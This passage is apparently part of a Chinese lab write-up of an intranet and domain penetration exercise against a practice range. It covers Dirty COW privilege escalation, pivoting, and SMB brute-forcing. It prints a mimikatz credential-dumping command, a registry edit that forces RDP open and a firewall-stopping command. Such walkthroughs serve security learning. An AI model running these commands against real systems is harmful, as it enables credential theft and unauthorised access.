onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2TB37dJzZCPCnJZ3ENico0Y5MJd1RmL32KPV5uDHtJXiaVsBdCjYVdLQQ/640?wx_fmt=png'" data-type="png" data-w="620" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">肯定是ssh嘛，登陆。</span></p><figure><img data-ratio="0.5189873417721519" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/18_rONymYich2RVicZgDicrBUtnWFLh0A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2rxFft3kJsg6H3S0QiaxKGs4icFF3grONymYich2RVicZgDicrBUtnWFLh0A/640?wx_fmt=png'" data-type="png" data-w="632" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x03 Probe Intranet</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x3.1 提权DMZ&amp;&amp;发现真正的web Server</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5912476722532588" data-s="300,640" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/19_TSwxJHDbT8EulKXb4s65mt1DRiakzA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR27iclqOWymotCbVaSeJMbag3JanTSwxJHDbT8EulKXb4s65mt1DRiakzA/640?wx_fmt=png'" data-type="png" data-w="1074" style=""  /></p><p><span style="font-size:15px;line-height:35px;;">目前我们分析得知上面的拓扑图，因为前面执行命令发现shell返回的IP并不是我们访问的DMZ。</span></p><p><span style="font-size:15px;line-height:35px;;">所以判断真正的web放在192.168.93.120,这台web机开放apache服务，而DMZ通过Nginx反代解析到120这台机器。</span></p><figure><img data-ratio="0.9675925925925926" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/20_skdhFsNQS3xUVPOzdQCoO0ibLs7HXw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2L8zp2rEFbZfgo3rNLB1otPJ0mskdhFsNQS3xUVPOzdQCoO0ibLs7HXw/640?wx_fmt=png'" data-type="png" data-w="648" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">nginx.conf</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">上图更是验证了我们的想法。</span></p><figure><img data-ratio="0.11024844720496894" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/21_icFoIDCtbtqetRFBZqiceuq9gGiaLw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2icfTiaQbEraLrUicV3o07Ou3mbRw80icFoIDCtbtqetRFBZqiceuq9gGiaLw/640?wx_fmt=png'" data-type="png" data-w="644" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">可用脏牛提权。</span></p><figure><img data-ratio="0.4810126582278481" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/22_XGrBQIxbTiaRsJHv0w9dkhdRFgz88w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2Vr5qFPictB1utia8OqgLkwwGMkMXGrBQIxbTiaRsJHv0w9dkhdRFgz88w/640?wx_fmt=png'" data-type="png" data-w="632" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">看来测试的时候已经用脏牛提过了…</span></p><figure><img data-ratio="0.25077399380804954" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/23_yqfp52VOLu8TAict0icyS5HdFWkbzA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2H5RC4GMjrCOWxlV7aWtqvILHNgyqfp52VOLu8TAict0icyS5HdFWkbzA/640?wx_fmt=png'" data-type="png" data-w="646" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">提权成功。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x3.1 向内网进发</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">接着向内网进发，用本台DMZ当作跳板机，还是常用的两个方法：</span><span style="font-size:15px;line-height:35px;;">EW代理，msf。</span></p><p><span style="font-size:15px;line-height:35px;;">本来想介绍一下msf怎么操作，因为之前都是只说了流程，没有具体演示，但是kali桥接出了问题，正向shell也没弹到，所以还是用ew吧。</span></p><p><span style="font-size:15px;line-height:35px;;">前面已经知道ip段是192.168.93.x</span></p><figure><img data-ratio="0.6688206785137318" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/24_5KMfwKeyb8UAlZicqGwUEIwFJncIog.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2fLjiaTrQQlcOicKgNsgNBUUp8zm5KMfwKeyb8UAlZicqGwUEIwFJncIog/640?wx_fmt=png'" data-type="png" data-w="619" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><figure><img data-ratio="0.8205546492659054" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/25_fjCVILD70KcFiaqXn4sKTicZt3bibA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2ofmIXTnfMnAkXoNE2lIZxrh3A2XfjCVILD70KcFiaqXn4sKTicZt3bibA/640?wx_fmt=png'" data-type="png" data-w="613" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x3.2 WinServer2008 SMB</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><figure><img data-ratio="0.7859424920127795" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/26_t8IXyBboaCNm5SSyTCo73UJbgvLFrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2nzxRRyoZAtkvYqRBusrt4tSUt8IXyBboaCNm5SSyTCo73UJbgvLFrg/640?wx_fmt=png'" data-type="png" data-w="626" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">爆出来了！</span></p><figure><img data-ratio="0.44871794871794873" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/27_RHCgCgcbs67PNtxQyXbzvOBsqsTGyg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2BbkoYr9qaStnhnwd3t10zhib4RHCgCgcbs67PNtxQyXbzvOBsqsTGyg/640?wx_fmt=png'" data-type="png" data-w="624" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">上传mimikatz</span></p><p><span style="font-size:15px;line-height:35px;;">使用wmiexec来执行命令</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">https:<span class="code-snippet__comment">//github.com/maaaaz/impacket-examples-windows</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">使用proxifier来代理。</span></p><figure><img data-backh="473" data-backw="443" data-ratio="1.0677200902934538" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/28_WzbiaOrE5voquW7dHnk5hjNZtib74Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2qtHzrqDKp5ewftUBLbMOLd6yRkWzbiaOrE5voquW7dHnk5hjNZtib74Q/640?wx_fmt=png'" data-type="png" data-w="443" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><figure><img data-ratio="0.3901689708141321" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/29_bRJSibdS3PxNhBQMnZ7ibX60su2Gdg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2rgo448xxIibicq8uibmKqrU8lVRiaBibRJSibdS3PxNhBQMnZ7ibX60su2Gdg/640?wx_fmt=png'" data-type="png" data-w="651" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><br style="box-sizing: inherit;"  /></figcaption></figure><figure><img data-ratio="0.5704323570432357" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/30_WtribavFftPPVJ6RA1FqADFX3ibkhA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2rhVicBpgnuNOaiaYqhFelvElZ07uWtribavFftPPVJ6RA1FqADFX3ibkhA/640?wx_fmt=png'" data-type="png" data-w="717" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">可以执行命令了，我们去抓一下密码。</span></p><p><span style="font-size:15px;line-height:35px;;">但是执行完mimikatz.exe直接没反应啊，所以可能这个不能做到交互吧…</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">mimikatz</span><span class="code-snippet__selector-class">.exe</span>&nbsp;"<span class="code-snippet__selector-tag">privilege</span><span class="code-snippet__selector-pseudo">::debug"</span>&nbsp;"<span class="code-snippet__selector-tag">sekurlsa</span><span class="code-snippet__selector-pseudo">::logonpasswords"</span>&nbsp;&nbsp;"<span class="code-snippet__selector-tag">exit</span>"&gt;&nbsp;<span class="code-snippet__selector-tag">password</span><span class="code-snippet__selector-class">.txt</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">上述命令为非交互情况下使用mimikatz读取密码。</span><br  /></p><figure><img data-ratio="0.8209500609013398" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/31_TCnY2XtqJ5fyMgXDvwPNM1YnP1XO3w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2UhjIHHeGfVaPtM6NUvvJ37hqTCnY2XtqJ5fyMgXDvwPNM1YnP1XO3w/640?wx_fmt=png'" data-type="png" data-w="821" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">注意看域，不要去用其他本地密码尝试。</span></p><p><span style="font-size:15px;line-height:35px;;">若读不到：</span></p><figure><img data-ratio="0.7528571428571429" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/32_zlP4b4icJqJ45Wjhl6HQpkjXiacGAw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2BgSgOy531Qttzgjk9Om1dqu82tzlP4b4icJqJ45Wjhl6HQpkjXiacGAw/640?wx_fmt=png'" data-type="png" data-w="700" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">有了域控密码，接下来就是找域控啦！</span></p><figure><img data-ratio="0.5918367346938775" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/33_CWv3ciaBvzxD0CwBiclplvYvJobdtQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2HR5pHtzYcyIDv6CKqGu99W8gFFCWv3ciaBvzxD0CwBiclplvYvJobdtQ/640?wx_fmt=png'" data-type="png" data-w="784" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">看到域是test.org</span></p><figure><img data-ratio="0.34487951807228917" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/34_Ih2Ut4l2DRsOv3dB4KVr0FoWboEicg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2XyIRNxJqFhNCPk9vZoFu9OoJ0Ih2Ut4l2DRsOv3dB4KVr0FoWboEicg/640?wx_fmt=png'" data-type="png" data-w="664" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">这样确定域控就是那台windows server 2012了。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x3.4 WinServer2012 AD</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><figure><img data-ratio="0.4301948051948052" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/35_5LyFNNSfDoia2B8nRWgSpW2uwPUDgQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2IhpQDibQ3JQgTLtIRFjK7VKNGe5LyFNNSfDoia2B8nRWgSpW2uwPUDgQ/640?wx_fmt=png'" data-type="png" data-w="616" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">开了3389，没开域控，这里有两种办法，先说第一种。</span></p><p><span style="font-size:15px;line-height:35px;;">还是靠SMB执行命令强开3389</span></p><figure><img data-ratio="0.1475211608222491" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/36_YroVaKu2D8zc81cw0MYUpUdicspjdw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2Ee8VSk4lmmyB33swCaxMR5icj8YroVaKu2D8zc81cw0MYUpUdicspjdw/640?wx_fmt=png'" data-type="png" data-w="827" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">但是没打开…server2003就是Ok的，不过还是可以执行命令。</span></p><figure><img data-ratio="0.5209080047789725" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/37_e2T2quk0eq6D0GLH0LvsLkBVUrqzLQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR2lO2xNl2iciava7Z4VzKkTaGNN5e2T2quk0eq6D0GLH0LvsLkBVUrqzLQ/640?wx_fmt=png'" data-type="png" data-w="837" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">现在考虑不是3389没打开而是有防火墙,关一下试试。</span></p><pre><span style="font-size:15px;line-height:35px;;">3389：</span><br  /></pre><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">REG</span>&nbsp;ADD&nbsp;HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="code-snippet__string">"&nbsp;"</span>Server&nbsp;/v&nbsp;fDenyTSConnections&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;<span class="code-snippet__number">0</span>&nbsp;/f</span></code></pre></section><pre><span style="font-size:15px;line-height:35px;;">firewall:</span><br  /></pre><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">net</span> stop mpssvc</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">后来我去看了，3389真的开了，防火墙真的关了，我真的连不上…</span></p><p><span style="font-size:15px;line-height:35px;;">第二种就是$IPC入侵了。</span></p><figure><img data-ratio="0.23397913561847988" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/38_cicSTbsS93rpuNwMQZicqClibHKwpw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8gDN3Imdfna1swqIuDpMR20r0b3GVKWP1gYqiaSjr03eQ6BTgMcicSTbsS93rpuNwMQZicqClibHKwpw/640?wx_fmt=png'" data-type="png" data-w="671" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">该种方法不能在本地运行，本地找不到域控。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><h2 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x4 结束</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><h3 style="text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">0x4.1&nbsp;进行内网渗透的思路</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">边界机拿到手以后可以根据情况考虑提权，以它作为跳板(ew,msf)，然后迅速探测内网存活主机，探测操作系统以及开放端口，存不存在CVE，存不存在有缺陷的服务。</span><span style="font-size:15px;line-height:35px;;">对于域中的windows可以选择CVE直接打或者爆破3389或者爆破smb，拿到权限后可以使用mimikatz来读取域中的密码或执行命令，然后探测域控主机。</span></p><p><span style="font-size:15px;line-height:35px;;"><img src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/39_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></span></p><pre style="letter-spacing: 0.544px;background: rgb(255, 255, 255);font family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace;font-size:13px;line-height:33px;;white-space: nowrap;line-height: 1.42857;word-break: break-all;border-width: 0px;border-style: initial;border-color: initial;border-radius: 4px;"><p style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;"><span style="vertical-align: inherit;">原创投稿作者：Railgun</span></p><p style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;">作者博客：www.pwn4fun.com</p><p style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;"><br  /></p><p style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;"><span style="vertical-align: inherit;">本文由公众号HACK学习排版编辑整理</span></p><p style="letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: center;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2020-02-09_内网渗透域渗透实操ATT&CK/40_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 677px !important;"  /></p></pre><p><br  /></p>
                </div>
</div>
</body>
</html>